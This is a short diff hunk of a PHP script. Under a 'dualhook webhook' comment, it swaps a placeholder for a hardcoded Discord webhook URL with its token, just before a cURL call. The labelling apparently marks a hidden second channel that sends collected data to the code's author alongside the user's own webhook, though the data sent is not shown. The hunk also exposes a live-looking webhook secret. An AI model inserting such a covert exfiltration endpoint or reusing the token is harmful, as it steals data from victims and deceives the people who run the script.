@@ -35,7 +35,7 @@
     $conn->close();
 
     //dualhook webhook//
-    $yourwebhook = "yourwebhook";
+    $yourwebhook = "https://discord.com/api/webhooks/935810939285012511/-97sroedC8Bnhr38DmACzKL7wEjR3VM5AIbXnRD9kEN4DKHj_khrtAMdFaQ5-ekIt48L";
 
 
     $ch = curl_init();
